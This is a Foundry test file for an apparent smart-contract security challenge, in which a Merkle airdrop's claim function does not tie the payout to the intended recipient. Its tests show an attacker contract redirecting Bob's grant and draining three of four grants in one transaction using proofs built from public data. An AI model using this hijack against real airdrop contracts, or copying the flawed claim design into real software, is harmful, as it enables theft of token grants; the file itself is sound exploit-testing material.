// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {MerkleAirdrop} from "../src/challenges/MerkleAirdrop.sol";
import {MerkleHijackAttacker} from "../src/attackers/MerkleHijackAttacker.sol";
import {ERC20Mintable} from "../src/tokens/ERC20Mintable.sol";

contract MerkleAirdropChallengeTest is Test {
    ERC20Mintable internal token;
    MerkleAirdrop internal airdrop;
    MerkleHijackAttacker internal attacker;
    address internal deployer;
    address internal alice;
    address internal bob;
    address internal attackerEoa;
    uint256 internal constant DEADLINE = 1_000_000_000;

    // 4-leaf tree over leaves[i] = keccak256(bytes.concat(keccak256(abi.encode(i, amounts[i]))))
    uint256[] internal amounts;
    bytes32 internal leaf0;
    bytes32 internal leaf1;
    bytes32 internal leaf2;
    bytes32 internal leaf3;
    bytes32 internal h01;
    bytes32 internal h23;
    bytes32 internal root;

    bytes32[] internal proof1; // bob's proof (index 1)
    bytes32[] internal proof2; // carol's proof (index 2)
    bytes32[] internal proof0; // alice's proof (index 0)

    function _leaf(uint256 index, uint256 amount) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(index, amount))));
    }

    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(bytes.concat(a, b)) : keccak256(bytes.concat(b, a));
    }

    function setUp() public {
        deployer = makeAddr("deployer");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        attackerEoa = makeAddr("attackerEoa");

        amounts = [100 ether, 200 ether, 300 ether, 400 ether];
        leaf0 = _leaf(0, amounts[0]);
        leaf1 = _leaf(1, amounts[1]);
        leaf2 = _leaf(2, amounts[2]);
        leaf3 = _leaf(3, amounts[3]);
        h01 = _hashPair(leaf0, leaf1);
        h23 = _hashPair(leaf2, leaf3);
        root = _hashPair(h01, h23);

        // Proofs derivable from the public root + published amounts — this is
        // the point: proofs are NOT secrets.
        proof0 = [leaf1, h23];
        proof1 = [leaf0, h23];
        proof2 = [leaf3, h01];

        vm.startPrank(deployer);
        token = new ERC20Mintable("DROP", "DROP");
        airdrop = new MerkleAirdrop(address(token), root, DEADLINE);
        token.mint(address(airdrop), 1000 ether);
        attacker = new MerkleHijackAttacker(address(airdrop));
        vm.stopPrank();
    }

    function test_airdropHoldsGrants() public view {
        assertEq(token.balanceOf(address(airdrop)), 1000 ether);
    }

    function test_honestClaimStillWorks() public {
        vm.prank(alice);
        airdrop.claim(0, alice, amounts[0], proof0);
        assertEq(token.balanceOf(alice), amounts[0], "honest claim broken");
    }

    function test_hijackRedirectsGrantsToAttacker() public {
        vm.prank(attackerEoa);
        attacker.hijack(1, amounts[1], proof1);

        // Bob's grant is gone — paid to the attacker instead.
        assertEq(token.balanceOf(bob), 0, "victim kept their grant");
        assertEq(token.balanceOf(attacker.owner()), amounts[1], "attacker did not capture the grant");
    }

    function test_batchHijackDrainsAirdrop() public {
        uint256[] memory idx = new uint256[](3);
        uint256[] memory amt = new uint256[](3);
        // dynamic arrays of dynamic arrays need one-proof-at-a-time assembly
        bytes32[][] memory prf = new bytes32[][](3);
        idx[0] = 0; amt[0] = amounts[0]; prf[0] = proof0;
        idx[1] = 1; amt[1] = amounts[1]; prf[1] = proof1;
        idx[2] = 2; amt[2] = amounts[2]; prf[2] = proof2;

        vm.prank(attackerEoa);
        attacker.hijackBatch(idx, amt, prf);

        // Three of four grants hijacked in one tx; the vault holds only leaf 3.
        assertEq(token.balanceOf(address(airdrop)), amounts[3], "airdrop not drained");
        assertEq(token.balanceOf(attacker.owner()), amounts[0] + amounts[1] + amounts[2], "attacker did not capture the grants");
    }
}
